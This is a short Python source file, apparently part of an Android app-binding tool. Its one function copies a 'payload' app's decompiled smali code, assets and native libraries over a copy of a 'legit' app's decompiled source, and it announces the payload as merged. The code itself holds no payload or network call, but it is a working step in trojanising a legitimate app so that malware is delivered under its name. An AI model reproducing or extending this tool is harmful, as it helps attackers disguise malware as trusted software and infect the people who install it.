import os
import shutil

def merge_sources(legit_src, payload_src, output_dir):
    """
    Merge payload source smali, libs, assets into legit source.
    """
    if os.path.exists(output_dir):
        shutil.rmtree(output_dir)
    shutil.copytree(legit_src, output_dir)

    # Merge smali
    for item in ["smali", "smali_classes2", "smali_classes3"]:
        payload_smali = os.path.join(payload_src, item)
        output_smali = os.path.join(output_dir, item)
        if os.path.exists(payload_smali):
            if not os.path.exists(output_smali):
                shutil.copytree(payload_smali, output_smali)
            else:
                for root, _, files in os.walk(payload_smali):
                    for f in files:
                        src_file = os.path.join(root, f)
                        rel_path = os.path.relpath(src_file, payload_smali)
                        dst_file = os.path.join(output_smali, rel_path)
                        os.makedirs(os.path.dirname(dst_file), exist_ok=True)
                        shutil.copy2(src_file, dst_file)

    # Merge assets
    payload_assets = os.path.join(payload_src, "assets")
    output_assets = os.path.join(output_dir, "assets")
    if os.path.exists(payload_assets):
        for root, _, files in os.walk(payload_assets):
            for f in files:
                src_file = os.path.join(root, f)
                rel_path = os.path.relpath(src_file, payload_assets)
                dst_file = os.path.join(output_assets, rel_path)
                os.makedirs(os.path.dirname(dst_file), exist_ok=True)
                shutil.copy2(src_file, dst_file)

    # Merge libs
    payload_lib = os.path.join(payload_src, "lib")
    output_lib = os.path.join(output_dir, "lib")
    if os.path.exists(payload_lib):
        for arch in os.listdir(payload_lib):
            arch_src = os.path.join(payload_lib, arch)
            arch_dst = os.path.join(output_lib, arch)
            if not os.path.exists(arch_dst):
                shutil.copytree(arch_src, arch_dst)
            else:
                for f in os.listdir(arch_src):
                    shutil.copy2(os.path.join(arch_src, f), os.path.join(arch_dst, f))

    print(f"[✓] Merged payload into: {output_dir}")
    return output_dir
